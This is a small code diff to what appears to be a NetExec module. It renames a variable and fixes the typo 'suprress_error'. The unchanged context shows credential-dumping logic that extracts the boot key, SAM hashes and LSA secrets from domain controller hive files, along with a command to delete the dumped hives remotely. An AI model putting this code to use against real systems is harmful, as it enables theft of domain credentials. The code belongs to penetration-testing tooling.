@@ -70,12 +70,12 @@ class NXCModule:
                     self.domain_admin_hash = fields[3]
 
             local_operations = LocalOperations(log_path + "SYSTEM")
-            bootKey = local_operations.getBootKey()
-            sam_hashes = SAMHashes(log_path + "SAM", bootKey, isRemote=False, perSecretCallback=lambda secret: parse_sam(secret))
+            boot_key = local_operations.getBootKey()
+            sam_hashes = SAMHashes(log_path + "SAM", boot_key, isRemote=False, perSecretCallback=lambda secret: parse_sam(secret))
             sam_hashes.dump()
             sam_hashes.finish()
 
-            LSA = LSASecrets(log_path + "SECURITY", bootKey, None, isRemote=False, perSecretCallback=lambda secret_type, secret: context.log.highlight(secret))
+            LSA = LSASecrets(log_path + "SECURITY", boot_key, None, isRemote=False, perSecretCallback=lambda secret_type, secret: context.log.highlight(secret))
             LSA.dumpCachedHashes()
             LSA.dumpSecrets()
         except Exception as e:
@@ -99,15 +99,15 @@ class NXCModule:
                     except SessionError as e:
                         if e.getErrorCode() != nt_errors.STATUS_OBJECT_PATH_NOT_FOUND:
                             context.log.fail(f"Fail to remove the file { hive }...")
-                            self.suprress_error(context)
+                            self.suppress_error(context)
                             sys.exit()
                 context.log.display("Successfully deleted dump files !")
             else:
-                self.suprress_error(context)
+                self.suppress_error(context)
         else:
-            self.suprress_error(context)
+            self.suppress_error(context)
 
-    def suprress_error(self, context):
+    def suppress_error(self, context):
         context.log.display("Use the domain admin account to clean the file on the remote host")
         context.log.display("netexec smb dc_ip -u user -p pass -x 'del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM'")
 
